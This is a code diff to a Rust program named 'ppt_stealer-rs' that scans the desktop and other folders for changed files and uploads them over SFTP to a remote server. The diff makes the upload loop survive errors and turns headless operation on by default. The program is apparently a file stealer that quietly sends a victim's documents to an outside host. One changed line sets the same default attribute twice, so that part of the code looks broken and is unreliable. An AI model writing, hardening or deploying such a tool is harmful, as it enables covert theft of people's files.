@@ -18,7 +18,7 @@ mod watch_dog;
 mod connection_tools;
 
 #[derive(Parser, Debug)]
-#[command(name = "ppt_stealer-rs", version = "0.2-beta.5")]
+#[command(name = "ppt_stealer-rs", version)]
 #[command(about, long_about = None, author)]
 #[command(color = clap::ColorChoice::Always)]
 #[command(help_template = "\
@@ -54,7 +54,7 @@ struct Cli {
     #[arg(long, default_value_t = 30, help = "Refresh interval in seconds")]
     refresh_interval: u64,
 
-    #[arg(long, default_value_t = false, help = "Assign no GUI mode")]
+    #[arg(long, default_value_t = false, help = "Assign no GUI mode", default_value_t = true)]
     no_gui: bool,
 
     #[arg(long, help = "Scan additional folder for files.")]
@@ -85,7 +85,6 @@ enum DebugLevel {
 
 fn main() {
 
-    
     // Parse command line arguments
     let args = Cli::parse();
 
@@ -205,7 +204,13 @@ fn no_gui(desktop_path: &Path, args: Cli) {
 
         // let paths: Vec<&Path> = path_bufs.iter().map(|p: &PathBuf| p.as_path()).collect::<Vec<&Path>>();
 
-        let new_file_hashes = watch_dog::get_hashes(&path_bufs);
+        let new_file_hashes = match watch_dog::get_hashes(&path_bufs) {
+            Ok(hashes) => hashes,
+            Err(e) => {
+                log::warn!("Error getting hashes: Maybe the file is removed? Error code: {}:", e);
+                continue;
+            }
+        };
 
         let changed_files: Vec<PathBuf> = watch_dog::get_changed_files(&file_hashes, &new_file_hashes);
 
@@ -417,16 +422,38 @@ fn upload_files(files_and_roots_path: &[[&Path; 2]], args: &Cli, sess: &Arc<Mute
 
         // open local file
         log::trace!("Opening local file {}", file_path.display());
-        let mut local_file = fs::File::open(file_path).expect("Failed to open local file.");
+        let mut local_file = match fs::File::open(file_path){
+            Ok(file) => file,
+            Err(err) => {
+                log::warn!("Failed to open local file {}: Maybe the file is removed? Error info: {}", file_path.display(), err);
+                continue;
+            },
+        };
 
         // open remote file
         log::trace!("Opening remote file {}", remote_path.display());
-        let mut remote_file = sftp.create(remote_path).expect("Failed to create remote file.");
+        let mut remote_file = match sftp.create(remote_path)  {
+            Ok(file) => file,
+            Err(err) => {
+                log::warn!("Failed to create remote file {}: Maybe connection lost? Error  {}", remote_path.display(), err);
+                continue;
+            },
+        };
         
-        io::copy(&mut local_file, &mut remote_file).expect("Failed to copy file.");
-
-        log::info!("Uploaded {} to {}", file_path.display(), remote_path.display());
-
+        // copy file
+        match io::copy(&mut local_file, &mut remote_file) {
+            Ok(_) => {
+                log::info!("Uploaded {} to {} successfully.", file_path.display(), remote_path.display());
+            },
+            Err(err) => {
+                log::warn!(
+                    "Failed to upload local file {} to remote path {}: Maybe connection lost or permission denied? Error info: {}",
+                    file_path.display(), remote_path.display(),
+                    err
+                );
+                continue;
+            }
+        };
     }
     log::info!("Finished uploading files.");
 }
